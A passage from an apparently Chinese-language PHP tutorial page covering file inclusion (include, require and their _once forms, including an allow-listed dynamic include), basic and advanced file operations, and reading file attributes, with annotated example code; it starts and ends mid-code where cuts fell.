class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="11-PHP-Include-文件"><a href="#11-PHP-Include-文件" class="headerlink" title="11. PHP Include 文件"></a>11. PHP Include 文件</h2><h3 id="详细解释-10"><a href="#详细解释-10" class="headerlink" title="详细解释"></a>详细解释</h3><p>PHP提供文件包含机制，允许将一个PHP文件的内容包含到另一个PHP文件中。</p>
<h3 id="主要文件包含函数："><a href="#主要文件包含函数：" class="headerlink" title="主要文件包含函数："></a>主要文件包含函数：</h3><ul>
<li><code>include</code>：包含文件，如果文件不存在，产生警告，脚本继续执行</li>
<li><code>require</code>：包含文件，如果文件不存在，产生致命错误，脚本终止</li>
<li><code>include_once</code>：与include相同，但确保文件只被包含一次</li>
<li><code>require_once</code>：与require相同，但确保文件只被包含一次</li>
</ul>
<h3 id="文件包含特点："><a href="#文件包含特点：" class="headerlink" title="文件包含特点："></a>文件包含特点：</h3><ul>
<li>可以包含任意类型的文件（.php, .html, .txt等）</li>
<li>包含的文件会执行其中的PHP代码</li>
<li>被包含文件可以访问包含文件的变量（根据作用域规则）</li>
</ul>
<h3 id="11-1-基本文件包含"><a href="#11-1-基本文件包含" class="headerlink" title="11.1 基本文件包含"></a>11.1 基本文件包含</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// header.php</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;header&gt;</span><br><span class="line">    &lt;h1&gt;My Website&lt;/h1&gt;</span><br><span class="line">    &lt;nav&gt;</span><br><span class="line">        &lt;a href=<span class="string">&quot;/&quot;</span>&gt;Home&lt;/a&gt;</span><br><span class="line">        &lt;a href=<span class="string">&quot;/about&quot;</span>&gt;About&lt;/a&gt;</span><br><span class="line">        &lt;a href=<span class="string">&quot;/contact&quot;</span>&gt;Contact&lt;/a&gt;</span><br><span class="line">    &lt;/nav&gt;</span><br><span class="line">&lt;/header&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// footer.php</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;footer&gt;</span><br><span class="line">    &lt;p&gt;&amp;copy; <span class="number">2023</span> My Website. All rights reserved.&lt;/p&gt;</span><br><span class="line">&lt;/footer&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// index.php</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;My Website&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span> <span class="keyword">include</span> <span class="string">&#x27;header.php&#x27;</span>; <span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">    &lt;main&gt;</span><br><span class="line">        &lt;h2&gt;Welcome to My Website&lt;/h2&gt;</span><br><span class="line">        &lt;p&gt;This is the main content of the page.&lt;/p&gt;</span><br><span class="line">    &lt;/main&gt;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">&lt;?php</span> <span class="keyword">include</span> <span class="string">&#x27;footer.php&#x27;</span>; <span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<h3 id="11-2-文件包含高级用法"><a href="#11-2-文件包含高级用法" class="headerlink" title="11.2 文件包含高级用法"></a>11.2 文件包含高级用法</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// config.php</span></span><br><span class="line"><span class="variable">$databaseConfig</span> = [</span><br><span class="line">    <span class="string">&#x27;host&#x27;</span> =&gt; <span class="string">&#x27;localhost&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;username&#x27;</span> =&gt; <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;password&#x27;</span> =&gt; <span class="string">&#x27;password&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;database&#x27;</span> =&gt; <span class="string">&#x27;myapp&#x27;</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="comment">// functions.php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">formatCurrency</span>(<span class="params"><span class="variable">$amount</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;$&#x27;</span> . <span class="title function_ invoke__">number_format</span>(<span class="variable">$amount</span>, <span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 工具类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHelper</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 静态方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getFileExtension</span>(<span class="params"><span class="variable">$filename</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$filename</span>, PATHINFO_EXTENSION);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">sanitizeFilename</span>(<span class="params"><span class="variable">$filename</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^a-zA-Z0-9\.\-_]/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$filename</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// main.php</span></span><br><span class="line"><span class="comment">// 使用require_once确保配置只加载一次</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;config.php&#x27;</span>;</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;functions.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用静态方法</span></span><br><span class="line"><span class="variable">$filename</span> = <span class="string">&quot;document.pdf&quot;</span>;</span><br><span class="line"><span class="variable">$extension</span> = <span class="title class_">FileHelper</span>::<span class="title function_ invoke__">getFileExtension</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="variable">$safeName</span> = <span class="title class_">FileHelper</span>::<span class="title function_ invoke__">sanitizeFilename</span>(<span class="string">&quot;report/2023!.pdf&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用配置</span></span><br><span class="line"><span class="variable">$dsn</span> = <span class="string">&quot;mysql:host=<span class="subst">&#123;$databaseConfig[&#x27;host&#x27;]&#125;</span>;dbname=<span class="subst">&#123;$databaseConfig[&#x27;database&#x27;]&#125;</span>&quot;</span>;</span><br><span class="line"><span class="comment">// ...数据库连接代码...</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用函数</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Price: &quot;</span> . <span class="title function_ invoke__">formatCurrency</span>(<span class="number">19.99</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;File extension: &quot;</span> . <span class="variable">$extension</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Sanitized filename: &quot;</span> . <span class="variable">$safeName</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 动态包含</span></span><br><span class="line"><span class="variable">$page</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>] ?? <span class="string">&#x27;home&#x27;</span>;</span><br><span class="line"><span class="variable">$validPages</span> = [<span class="string">&#x27;home&#x27;</span>, <span class="string">&#x27;about&#x27;</span>, <span class="string">&#x27;contact&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$page</span>, <span class="variable">$validPages</span>)) &#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;<span class="subst">$page</span>.php&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;404.php&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="12-PHP-文件处理"><a href="#12-PHP-文件处理" class="headerlink" title="12. PHP 文件处理"></a>12. PHP 文件处理</h2><h3 id="详细解释-11"><a href="#详细解释-11" class="headerlink" title="详细解释"></a>详细解释</h3><p>PHP提供了一套完整的文件操作函数，用于读取、写入、创建和删除文件。</p>
<h3 id="主要文件操作函数："><a href="#主要文件操作函数：" class="headerlink" title="主要文件操作函数："></a>主要文件操作函数：</h3><ul>
<li><code>fopen()</code>：打开文件</li>
<li><code>fclose()</code>：关闭文件</li>
<li><code>fread()</code>：读取文件</li>
<li><code>fwrite()</code>：写入文件</li>
<li><code>file_get_contents()</code>：读取整个文件到字符串</li>
<li><code>file_put_contents()</code>：将字符串写入文件</li>
<li><code>file()</code>：读取文件到数组</li>
<li><code>file_exists()</code>：检查文件是否存在</li>
<li><code>is_file()</code>：检查是否为文件</li>
<li><code>is_dir()</code>：检查是否为目录</li>
<li><code>mkdir()</code>：创建目录</li>
<li><code>rmdir()</code>：删除目录</li>
<li><code>unlink()</code>：删除文件</li>
<li><code>rename()</code>：重命名文件或目录</li>
</ul>
<h3 id="12-1-基本文件操作"><a href="#12-1-基本文件操作" class="headerlink" title="12.1 基本文件操作"></a>12.1 基本文件操作</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 创建和写入文件</span></span><br><span class="line"><span class="variable">$filename</span> = <span class="string">&quot;example.txt&quot;</span>;</span><br><span class="line"><span class="variable">$content</span> = <span class="string">&quot;Hello, World!\nThis is a test file.\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用fopen和fwrite</span></span><br><span class="line"><span class="variable">$handle</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$filename</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$handle</span>, <span class="variable">$content</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$handle</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用file_put_contents（更简单）</span></span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$content</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 读取文件</span></span><br><span class="line"><span class="variable">$contents</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;File contents:\n<span class="subst">$contents</span>\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 逐行读取</span></span><br><span class="line"><span class="variable">$lines</span> = <span class="title function_ invoke__">file</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Lines:\n&quot;</span>;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$lines</span> <span class="keyword">as</span> <span class="variable">$line</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$line</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查文件是否存在</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;File exists.\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取文件信息</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;File size: &quot;</span> . <span class="title function_ invoke__">filesize</span>(<span class="variable">$filename</span>) . <span class="string">&quot; bytes\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;File last modified: &quot;</span> . <span class="title function_ invoke__">date</span>(<span class="string">&quot;Y-m-d H:i:s&quot;</span>, <span class="title function_ invoke__">filemtime</span>(<span class="variable">$filename</span>)) . <span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure>

<h3 id="12-2-高级文件操作"><a href="#12-2-高级文件操作" class="headerlink" title="12.2 高级文件操作"></a>12.2 高级文件操作</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 创建目录</span></span><br><span class="line"><span class="variable">$dir</span> = <span class="string">&quot;uploads&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$dir</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">mkdir</span>(<span class="variable">$dir</span>, <span class="number">0777</span>, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Directory created.\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 递归读取目录</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">listFiles</span>(<span class="params"><span class="variable">$dir</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$files</span> = [];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$handle</span> = <span class="title function_ invoke__">opendir</span>(<span class="variable">$dir</span>)) &#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">false</span> !== (<span class="variable">$entry</span> = <span class="title function_ invoke__">readdir</span>(<span class="variable">$handle</span>))) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$entry</span> != <span class="string">&quot;.&quot;</span> &amp;&amp; <span class="variable">$entry</span> != <span class="string">&quot;..&quot;</span>) &#123;</span><br><span class="line">                <span class="variable">$path</span> = <span class="variable">$dir</span> . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$entry</span>;</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">is_dir</span>(<span class="variable">$path</span>)) &#123;</span><br><span class="line">                    <span class="variable">$files</span> = <span class="title function_ invoke__">array_merge</span>(<span class="variable">$files</span>, <span class="title function_ invoke__">listFiles</span>(<span class="variable">$path</span>));</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="variable">$files</span>[] = <span class="variable">$path</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">closedir</span>(<span class="variable">$handle</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$files</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$allFiles</span> = <span class="title function_ invoke__">listFiles</span>(<span class="string">&quot;.&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;All files:\n&quot;</span>;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$allFiles</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$file</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 文件复制和移动</span></span><br><span class="line"><span class="variable">$source</span> = <span class="string">&quot;example.txt&quot;</span>;</span><br><span class="line"><span class="variable">$destination</span> = <span class="string">&quot;backup/example.txt&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建备份目录</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">file_exists</span>(<span class="string">&quot;backup&quot;</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">mkdir</span>(<span class="string">&quot;backup&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 复制文件</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">copy</span>(<span class="variable">$source</span>, <span class="variable">$destination</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;File copied successfully.\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 重命名/移动文件</span></span><br><span class="line"><span class="variable">$renamed</span> = <span class="string">&quot;example_backup.txt&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">rename</span>(<span class="variable">$source</span>, <span class="variable">$renamed</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;File renamed successfully.\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 删除文件</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$renamed</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unlink</span>(<span class="variable">$renamed</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;File deleted.\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建静态文件处理器</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileProcessor</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> <span class="variable">$instance</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$logFile</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$logFile</span> = <span class="string">&#x27;file_log.txt&#x27;</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;logFile = <span class="variable">$logFile</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getInstance</span>(<span class="params"><span class="variable">$logFile</span> = <span class="string">&#x27;file_log.txt&#x27;</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">self</span>::<span class="variable">$instance</span> === <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="built_in">self</span>::<span class="variable">$instance</span> = <span class="keyword">new</span> <span class="built_in">self</span>(<span class="variable">$logFile</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">self</span>::<span class="variable">$instance</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">createFile</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$content</span> = <span class="string">&#x27;&#x27;</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$instance</span> = <span class="built_in">self</span>::<span class="title function_ invoke__">getInstance</span>();</span><br><span class="line">        <span class="variable">$result</span> = <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$content</span>);</span><br><span class="line">        <span class="variable">$instance</span>-&gt;<span class="title function_ invoke__">log</span>(<span class="string">&quot;Created file: <span class="subst">$filename</span>&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$result</span> !== <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">readFile</span>(<span class="params"><span class="variable">$filename</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$instance</span> = <span class="built_in">self</span>::<span class="title function_ invoke__">getInstance</span>();</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">            <span class="variable">$instance</span>-&gt;<span class="title function_ invoke__">log</span>(<span class="string">&quot;File not found: <span class="subst">$filename</span>&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$instance</span>-&gt;<span class="title function_ invoke__">log</span>(<span class="string">&quot;Read file: <span class="subst">$filename</span>&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">log</span>(<span class="params"><span class="variable">$message</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$timestamp</span> = <span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>);</span><br><span class="line">        <span class="variable">$logEntry</span> = <span class="string">&quot;[<span class="subst">$timestamp</span>] <span class="subst">$message</span>\n&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;logFile, <span class="variable">$logEntry</span>, FILE_APPEND);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">__clone</span>(<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用静态方法</span></span><br><span class="line"><span class="title class_">FileProcessor</span>::<span class="title function_ invoke__">createFile</span>(<span class="string">&#x27;test.txt&#x27;</span>, <span class="string">&#x27;This is a test file.&#x27;</span>);</span><br><span class="line"><span class="variable">$content</span> = <span class="title class_">FileProcessor</span>::<span class="title function_ invoke__">readFile</span>(<span class="string">&#x27;test.txt&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$content</span> . <span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure>

<h2 id="13-PHP获取文件属性"><a href="#13-PHP获取文件属性" class="headerlink" title="13. PHP获取文件属性"></a>13. PHP获取文件属性</h2><h3 id="详细解释-12"><a href="#详细解释-12" class="headerlink" title="详细解释"></a>详细解释</h3><p>PHP提供了一系列函数来获取文件的属性信息，如大小、类型、权限等。</p>
<h3 id="主要文件属性函数："><a href="#主要文件属性函数：" class="headerlink" title="主要文件属性函数："></a>主要文件属性函数：</h3><ul>
<li><code>file_exists()</code>：检查文件是否存在</li>
<li><code>is_file()</code>：检查是否为文件</li>
<li><code>is_dir()</code>：检查是否为目录</li>
<li><code>is_readable()</code>：检查文件是否可读</li>
<li><code>is_writable()</code>：检查文件是否可写</li>
<li><code>fileatime()</code>：获取文件上次访问时间</li>
<li><code>filemtime()</code>：获取文件上次修改时间</li>
<li><code>filectime()</code>：获取文件创建时间</li>
<li><code>filesize()</code>：获取文件大小</li>
<li><code>filetype()</code>：获取文件类型</li>
</ul>
<h3 id="示例-3"><a href="#示例-3" class="headerlink" title="示例"></a>示例</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$filename</span> = <span class="string">&quot;example.txt&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查文件是否存在</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;File exists.\n&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 检查文件类型</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Is file: &quot;</span> . (<span class="title function_ invoke__">is_file</span>(<span class="variable">$filename</span>) ? <span class="string">&quot;Yes&quot;</span> : <span class="string">&quot;No&quot;</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Is directory: &quot;</span> . (<span class="title function_ invoke__">is_dir</span>(<span class="variable">$filename</span>) ? <span class="string">&quot;Yes&quot;</span> : <span class="string">&quot;No&quot;</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 检查权限</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Is readable: &quot;</span> . (<span class="title function_ invoke__">is_readable</span>(<span class="variable">$filename</span>) ? <span class="string">&quot;Yes&quot;</span> : <span class="string">&quot;No&quot;</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Is writable: &quot;</span> . (<span class="title function_ invoke__">is_writable</span>(<span class="variable">$filename</span>) ? <span class="string">&quot;Yes&quot;</span> : <span class="string">&quot;No&quot;</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 获取时间信息</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Last accessed: &quot;</span> . <span class="title function_ invoke__">date</span>(<span class="string">&quot;Y-m-d H:i:s&quot;</span>, <span class="title function_ invoke__">fileatime</span>(<span class="variable">$filename</span>)) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Last modified: &quot;</span> . <span class="title function_ invoke__">date</span>(<span class="string">&quot;Y-m-d H:i:s&quot;</span>, <span class="title function_ invoke__">filemtime</span>(<span class="variable">$filename</span>)) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;File creation: &quot;</span> . <span class="title function_ invoke__">date</span>(<span class="string">&quot;Y-m-d H:i:s&quot;</span>, <span class="title function_ invoke__">filectime</span>(<span class="variable">$filename</span>)) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 获取文件大小</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;File size: &quot;</span> . <span class="title function_ invoke__">filesize</span>(<span class="variable">$filename</span>) . <span class="string">&quot; bytes\n&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 获取文件类型</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;File type: &quot;</span> . <span class="title function_ invoke__">filetype</span>(<span class="variable">$filename</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 获取文件权限</span></span><br><span class="line">    <span class="variable">$permissions</span> = <span class="title function_ invoke__">fileperms</span>(<span class="variable">$filename</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;File permissions: &quot;</span> . <span class="title function_ invoke__">decoct</span>(<span class="variable">$permissions</span> &amp; <span class="number">0777</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;File does not exist.\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建文件信息工具</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileInfo</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 静态缓存</span></span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> <span class="variable">$cache</span> = [];</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 静态方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"><span class="variable">$filename</span></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// 检查缓存</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="built_in">self</span>::<span class="variable">$cache</span>[<span class="variable">$filename</span>])) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">self</span>::<span class="variable">$cache</span>[<span class="variable">$filename</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="variable">$info</span> = [</span><br><span class="line">            <span class="string">&#x27;name&#x27;</span> =&gt; <span class="title function_ invoke__">basename</span>(<span class="variable">$filename</span>),</span><br><span class="line">            <span class="string">&#x27;path&#x27;</span> =&gt; <span class="title function_ invoke__">realpath</span>(<span class="variable">$filename</span>),</span><br><span class="line">            <span class="string">&#x27;size&#x27;</span> =&gt; <span class="title function_ invoke__">filesize</span>(<span class="variable">$filename</span>),</span><br><span class="line">            <span class="string">&#x27;type&#x27;</span> =&gt; <span class="title function_ invoke__">filetype</span>(<span class="variable">$filename</span>),</span><br><span class="line">            <span class="string">&#x27;mime&#x27;</span> =&gt; <span class="title function_ invoke__">mime_content_type</span>(<span class="variable">$filename</span>),</span><br><span class="line">            <span class="string">&#x27;readable&#x27;</span> =&gt; <span class="title function_ invoke__">is_readable</span>(<span class="variable">$filename</span>),</span><br><span class="line">            <span class="string">&#x27;writable&#x27;</span> =&gt; <span class="title function_ invoke__">is_writable</span>(<span class="variable">$filename</span>),</span><br><span class="line">            <span class="string">&#x27;created&#x27;</span> =&gt; <span class="title function_ invoke__">date</span>(<span class="string">&quot;Y-m-d H:i:s&quot;</span>, <span class="title function_ invoke__">filectime</span>(<span class="variable">$filename</span>)),</span><br><span class="line">            <span class="string">&#x27;modified&#x27;</span> =&gt; <span class="title function_ invoke__">date</span>(<span 